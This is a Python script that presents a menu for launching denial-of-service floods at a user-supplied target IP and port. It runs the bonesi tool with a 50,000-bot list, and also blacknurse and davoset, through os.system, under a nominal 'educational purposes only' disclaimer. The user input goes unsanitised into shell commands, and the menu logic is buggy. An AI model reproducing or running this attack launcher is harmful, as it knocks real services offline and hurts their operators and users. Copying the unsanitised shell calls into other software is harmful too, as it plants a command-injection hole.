import os
import sys
import time

class DDOS:
    print("""
    
____  ___                  ________  ________          _________
\   \/  /____   ____   ____\______ \ \______ \   ____ /   _____/
 \     // __ \ /    \ /  _ \|    |  \ |    |  \ /  _ \\_____  \ 
 /     \  ___/|   |  (  <_> )    `   \|    `   (  <_> )        \ 
/___/\  \___  >___|  /\____/_______  /_______  /\____/_______  /
      \_/   \/     \/              \/        \/              \/ 
""")
    print("""
Powered by: bonesi ddos tool combined with 50-k botnets
DISCLAIMER: This tool is for educational purposes only.
Created by: Genesis""")

    print("""
    [1] DDOS ATTACK
    [2] ping host
    [3] exit \n""")
    while True:
        choice = input("Enter your choice: ")
        if choice == "1":
            print("""
            [1] bonsi DDOS
            [2] blacknurse DDOS
            [3] davoset DDOS
            [4] exit \n""")
            while True:
                choice = input("Enter your choice: ")
                if choice == "1":
                    print("Invalid input")
                    host_ip = input("Enter the host ip: ")
                    host_port = input("Enter the host port: ")
                    net_interface = input("Enter the network interface: ")
                    os.system('bonesi -i /usr/share/bonesi/50k-bots.txt -p tcp -r 0 -d '+net_interface+' -b /usr/share/bonesi/browserlist.txt ' + host_ip + ':' + host_port)
                    time.sleep(5)
                    os.system('clear')
                if choice == "2":
                    target_ip = input("Enter the target ip: ")
                    os.system('blacknurse ' + target_ip)
                    time.sleep(5)
                    os.system('clear')
                if choice == "3":
                    os.system('davoset')
                    time.sleep(5)
                    os.system('clear')
                if choice == "4":
                    break
        if choice == "2":
            host_ip = input("Enter the host ip: ")
            os.system('ping ' + host_ip)
        if choice == "3":
            sys.exit()
        else:
            print("Invalid choice")
            os.system('clear')

if __name__ == "__main__":
    DDOS()